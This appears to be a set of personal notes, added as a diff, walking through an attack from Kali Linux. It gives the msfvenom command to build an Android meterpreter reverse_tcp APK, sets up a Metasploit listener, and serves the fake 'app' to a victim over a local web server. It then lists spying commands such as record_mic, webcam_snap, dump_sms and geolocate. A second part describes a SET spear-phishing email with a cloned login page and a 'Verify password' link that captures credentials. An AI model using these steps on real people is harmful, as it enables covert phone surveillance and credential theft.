@@ -1,0 +1,70 @@
+Penetration testing om Kali Linux
+
+/* For starters make a directory for a better storing and convenience for further steps */
+mkdir Test
+
+/*Then we enter the new directory*/
+cd Test
+
+/*Generate the payload-like file*/
+msfvenom -p android/meterpreter/reverse_tcp LHOST=<attacker's IP address> LPORT=<the port ypu want to initialize a listener> R > pentest.apk
+
+/* We use the msfvenom for the generation of the payload and since the targeted devices are mobile phones we state that the OS should be android
+  (it works on all Linux based mobile OS, though), sepecify that we work the meterpreter tool of Metasploit and that we would initialize a 
+  listener and connect back to our device to exploit the victim. We set the attacker's IP and port to listen on. Finally, save the generated 
+  payload in a file ( R > is used to prevent the encripted payload to show in the terminal)
+*/
+
+/* Then we open the msfconsole to let the magic happen */
+msfconsole
+
+/*We use multihandler so as to avoid the default payload*/
+use multi/handler
+
+/* And now we configure the one ad the payload's one above */
+set payload android/meterpreter/reverse_tcp
+
+/* To see if the IP and port are already set we use 'show options'*/
+show options
+
+/* And if not we set the manually*/
+set LHOST <attacker's IP>
+set LPORT <port number>
+
+/* We start the listener*/
+run 
+/*or we can also use*/
+exploit
+
+/* In my case I host a local server for the 'app' that the victim should install...btw here the separate directory form the beginning comes in handy*/
+cd Test
+python3 -m http.server
+
+/* after the 'app' has been dowloaded, the session should start and now we have various commands to interact with the victim device
+  I believe that it is not necessary to write what every one of them does...they sepak for themselves
+*/
+record_mic
+webcam_snap
+dump_calllog
+dump_sms
+send_sms
+geolocate
+etc.
+
+
+/*For the second part I use SET toolkit for our little phishing show*/
+setoolkit
+
+/*here we have different options that are chosen by numbers and there are no actual commands so I will just shortly describe the steps necessary*/
+
+/*
+  I am using a 'mass mailer attack' and 'spear phishing attack' method. Even though I have conducted the test to only one account...nevermind.
+  Here the toolkit provides the following. In the terminal we have som steps to write an email. Step by step we are asked to write the email 
+  of the victim, our email(of course not the real one). The theme and the body of the email. Then we can set if the email is of 'high priority'
+  In the body of the email I have added a link made with 'website attack vectors' that initiates a listener when the victim opens it. It copies 
+  the UI of a website and attaches the lsitener to the copied site's IP. I set am alternative text of the link as 'Verify password' and after the
+  victim entered their credentials(email and password) I got them in th einitialised listener in the terminal.
+*/
+
+/* The grand finale...Social engineering is awesome*/
+
